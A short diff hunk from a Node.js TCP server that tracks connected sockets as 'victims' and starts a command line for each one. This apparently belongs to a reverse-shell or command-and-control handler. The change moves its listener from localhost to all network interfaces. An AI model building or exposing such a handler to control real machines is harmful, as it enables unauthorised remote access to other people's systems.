@@ -37,7 +37,7 @@ net.createServer(function(sock) {
     });
 
     victims.push({socket: sock, initialized: false});
-}).listen(tcpPort, '127.0.0.1');
+}).listen(tcpPort, '0.0.0.0');
 
 // Remove possible event listener for receiving first messages
 function initializeCommandLine(victim){
